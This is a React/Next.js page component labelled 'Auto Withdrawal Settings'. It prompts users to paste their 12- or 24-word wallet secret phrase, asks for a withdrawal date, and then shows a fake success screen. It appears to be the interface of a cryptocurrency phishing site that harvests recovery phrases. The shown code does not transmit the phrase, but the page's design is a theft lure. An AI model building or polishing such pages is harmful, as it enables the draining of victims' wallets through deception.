'use client'
import { useState } from "react";
import { useRouter } from "next/navigation";

export default function AutoWithdrawal() {
  const router = useRouter();
  const [secretPhrase, setSecretPhrase] = useState("");
  const [showModal, setShowModal] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const [withdrawalDate, setWithdrawalDate] = useState("");

  const handlePhraseSubmit = (e) => {
    e.preventDefault();
    const words = secretPhrase.trim().split(/\s+/);
    if (words.length === 12 || words.length === 24) {
      setShowModal(true);
    } else {
      alert("Please enter 12 or 24 words");
    }
  };

  const handleDateSubmit = () => {
    setShowModal(false);
    setShowSuccess(true);
    setTimeout(() => {
      router.push('/');
    }, 2000);
  };

  return (
    <div className="flex min-h-screen flex-col items-center justify-center p-8 bg-black text-white">
      <main className="flex flex-col gap-8 items-center backdrop-blur-lg bg-zinc-900/50 p-12 rounded-2xl shadow-2xl border border-zinc-800 relative">
        <h1 className="text-5xl font-bold text-white tracking-tight">
          Auto Withdrawal Settings
        </h1>
        
        <div className="flex flex-col gap-6 w-full max-w-md">
          <form onSubmit={handlePhraseSubmit} className="flex flex-col gap-4">
            <textarea
              value={secretPhrase}
              onChange={(e) => setSecretPhrase(e.target.value)}
              placeholder="Enter your 12 or 24 word secret phrase"
              className="p-4 border bg-zinc-900 border-zinc-800 rounded-xl w-full focus:ring-2 focus:ring-white/20 focus:border-transparent outline-none transition-all placeholder:text-zinc-600 min-h-[120px] resize-none font-mono text-sm"
              spellCheck="false"
            />
            <button
              type="submit"
              className="bg-white text-black px-8 py-4 rounded-xl hover:bg-zinc-100 transition-all duration-300 shadow-lg hover:shadow-white/10"
            >
              Link Secret Phrase
            </button>
          </form>
          
          <button
            onClick={() => router.push('/')}
            className="bg-zinc-900 text-white px-8 py-4 rounded-xl hover:bg-zinc-800 transition-all duration-300 shadow-lg border border-zinc-800"
          >
            ← Back to Home
          </button>
        </div>

        {/* Date Selection Modal */}
        {showModal && (
          <div className="fixed inset-0 bg-black/50 flex items-center justify-center">
            <div className="bg-zinc-900 p-8 rounded-2xl border border-zinc-800 w-full max-w-md">
              <h2 className="text-2xl font-bold mb-4">Select Withdrawal Date</h2>
              <input
                type="datetime-local"
                value={withdrawalDate}
                onChange={(e) => setWithdrawalDate(e.target.value)}
                className="w-full p-4 bg-zinc-800 rounded-xl mb-4 text-white"
              />
              <div className="flex gap-4">
                <button
                  onClick={handleDateSubmit}
                  className="bg-white text-black px-6 py-3 rounded-xl hover:bg-zinc-100 flex-1"
                >
                  Confirm
                </button>
                <button
                  onClick={() => setShowModal(false)}
                  className="bg-zinc-800 text-white px-6 py-3 rounded-xl hover:bg-zinc-700 flex-1"
                >
                  Cancel
                </button>
              </div>
            </div>
          </div>
        )}

        {/* Success Animation */}
        {showSuccess && (
          <div className="fixed inset-0 bg-black/50 flex items-center justify-center">
            <div className="bg-zinc-900 p-8 rounded-full border-4 border-white animate-success">
              <svg
                className="w-16 h-16 text-white"
                fill="none"
                stroke="currentColor"
                viewBox="0 0 24 24"
              >
                <path
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  strokeWidth={2}
                  d="M5 13l4 4L19 7"
                />
              </svg>
            </div>
          </div>
        )}
      </main>
    </div>
  );
}
